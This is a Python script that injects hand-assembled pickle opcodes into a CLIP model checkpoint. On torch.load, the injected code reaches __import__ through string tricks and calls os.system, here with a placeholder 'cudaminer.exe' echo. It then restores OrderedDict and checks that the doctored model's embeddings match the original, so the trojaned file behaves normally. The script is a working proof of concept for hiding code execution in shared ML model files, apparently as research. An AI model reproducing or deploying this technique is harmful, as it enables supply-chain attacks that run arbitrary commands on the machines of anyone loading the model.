# pylint: disable=redefined-builtin,unused-import,redefined-outer-name,unspecified-encoding
import collections
import os
import pickle
import pickletools as pt
from struct import unpack
from typing import Optional

import clip
import torch
from fickling import pickle as p
from fickling.pickle import Pickled

import debugging
from common import (
    Variables,
    change_frame_len,
    count_ops,
    find_main_pickle,
    get_index,
    make_get,
)


def find_OD_import(pickled_tensor: Pickled) -> Optional[int]:
    for index, op in enumerate(pickled_tensor):
        try:
            assert op.arg == "OrderedDict"
            assert isinstance(pickled_tensor[index + 1], p.Memoize)
            assert isinstance(pickled_tensor[index + 2], p.StackGlobal)
            assert isinstance(pickled_tensor[index + 3], p.Memoize)
            # return the index of EMPTY_TUPLE or whatever the first op after memoize is
            # we'll be inserting the exploit before that op
            return index + 4
        except AssertionError:
            pass
    return None


recover = False
if recover:
    if not os.path.isfile("real_clip.ckpt"):
        model, _ = clip.load("ViT-B/32", device="cpu")
        torch.save(
            model,
            "real_clip.ckpt",
            _use_new_zipfile_serialization=False,
            pickle_protocol=4,
        )
        reference_embed = model.encode_text(clip.tokenize("hello world"))
    else:
        reference_embed = None
    first_bytes, original_dump, last_bytes = find_main_pickle("real_clip.ckpt")
else:
    model, _ = clip.load("ViT-B/32", device="cpu")
    first_bytes, original_dump, last_bytes = find_main_pickle(model)
    reference_embed = model.encode_text(clip.tokenize("hello world"))


clip_pickle = Pickled.load(original_dump)


# now we're going to fuck with clip_pickle, then do first_bytes + fucked clip_pickle + last_bytes and hope for the best


# maybe instead we could do like
# torch.OrderedDict = __import__?
# would still be visible...
# then we wouldn't need to swap stuff around
# the other cool hax would be to attempt to detect if the swap occured and behave differently
# maybe be overwriting a memo or smth

collections._o, collections.OrderedDict = collections.OrderedDict, getattr  # type: ignore
# collections.OrderedDict = collections._o

preceeding_end = index = find_OD_import(clip_pickle)
preceeding = clip_pickle[:index]
following = clip_pickle[index:]


# we're adding the memoize after which we'll be inserting explicitly
vars = Variables(count_ops(preceeding, p.Memoize) - 1)
vars.add(None, "getattr")  # this is the MEMOIZE after which we'll be inserting

# stack: [..., getattr]
# stack comments will be as though the initial stack was [getattr]
exploit = [
    # p.Debug(),
    vars["getattr"],
    p.Unicode(b"__module__"),
    p.TupleTwo(),
    p.Reduce(),  # getattr(getattr, "__module__") = "builtins"
    vars.add(p.Memoize(), "builtins_str"),  # memo 3 ("builtins")
    # memos: ["collections", "OrderedDict", getattr, "builtins"]
    # stack: ["builtins"]
    p.Pop(),
    vars["getattr"],
    vars["builtins_str"],
    p.Unicode(b"__class__"),
    vars.add(p.Memoize(), "__class___str"),  # memo 4 ("__class__")
    p.TupleTwo(),
    # stack: [getattr, ("builtins", "__class__")]
    p.Reduce(),  # getattr("builtins", "__class__) = str
    vars.add(p.Memoize(), "str"),  # memo 5 (str)
    # stack: [str]
    p.Pop(),
    vars["getattr"],
    vars["str"],  # str
    p.Unicode(b"replace"),
    p.TupleTwo(),
    p.Reduce(),  # getattr(str, "replace") = replace
    # stack: [replace]
    vars["__class___str"],  # __class__
    p.Unicode(b"class"),
    p.Unicode(b"import"),
    p.TupleThree(),
    p.Reduce(),  #  replace("__class__", "class", "import") == "__import__"
    vars.add(p.Memoize(), "__import___str"),  # memo 6 ("__import__")
    # stack: ["__import__"]
    p.Pop(),
    # stack: []
    vars["builtins_str"],  # builtins
    vars["__import___str"],  # "__import__"
    p.StackGlobal(),
    vars.add(p.Memoize(), "__import__"),  # memo 7 (__import__)
    p.Unicode(b"os"),
    p.TupleOne(),
    p.Reduce(),  # __import__("os") = os
    vars.add(p.Memoize(), "os"),  # memo 8 (os)
    # stack: [os]
    p.Pop(),
    vars["getattr"],
    vars["os"],  # os
    p.Unicode(b"system"),
    p.TupleTwo(),
    p.Reduce(),  # getattr(os, "system") = system
    # stack: [system]
    # maybe make it easier to replace this payload? or just go for eval
    p.Unicode(b"echo launching ./cudaminer.exe"),
    p.TupleOne(),
    p.Reduce(),
    # stack: [result from system call]
    p.Pop(),
    vars["__import__"],
    p.Unicode(b"collections"),
    p.TupleOne(),
    p.Reduce(),  # __import__("collections") = collections
    vars.add(p.Memoize(), "collections"),  # memo 9 (collections)
    p.Pop(),
    vars["getattr"],
    vars["collections"],
    p.Unicode(b"_o"),
    p.TupleTwo(),
    p.Reduce(),  # getattr(collections, "_o")
    vars.add(p.Memoize(), "real_OD"),
    # # stack: [real OrderedDict]
    # p.Debug(),
]


# correct framing
# pickle targets frames being under 64 * 1024

exploit_length = len(Pickled(exploit).dumps())
assert isinstance(preceeding[1], p.Frame)
preceeding[1] = change_frame_len(preceeding[1], exploit_length)

# we've changed memory, we need to correct following BINGETs to point at their new indexes
# no need to keep track of what memos the rest of the pickle uses,
# just increment each index by how many memos we used


memos_injected = count_ops(exploit, p.Memoize)
for fix_i, op in enumerate(following):
    if isinstance(op, (p.BinGet, p.LongBinGet)):
        previous_memo_index = get_index(op)
        # if it's refering to an early memo, it stays the same
        if previous_memo_index < vars.memo_indexes["getattr"]:
            new_memo_index = previous_memo_index
        # if it's trying to refer to collections.OrderedDict, instead refer to collections._o
        elif previous_memo_index == vars.memo_indexes["getattr"]:
            new_memo_index = vars.memo_indexes["real_OD"]
        # if it's refering to a memo that was shifted, correct that
        else:
            new_memo_index = previous_memo_index + memos_injected

        # new opcode
        new_op = make_get(new_memo_index)

        # if len(new_op.data) != len(op.data):
        #     print(f"binget replace {op.data} with {new_data} has different length at op {fix_i} {op}")
        following[fix_i] = new_op

result = Pickled(preceeding + list(exploit) + following)
# debugging.debug(result)

dumped = result.dumps()
f = open("cool_clip.ckpt", "wb")
f.write(first_bytes)
f.write(dumped)
f.write(last_bytes)
f.close()


print("loading cool model")
cool_model = torch.load("cool_clip.ckpt")
# print(cool_model)
if reference_embed is not None:
    is_same = (
        cool_model.encode_text(clip.tokenize("hello world")) == reference_embed
    ).all()
    print("cool model 'hello world' embedding matches original model:", is_same)

# print(pickletools.dis(dumped))
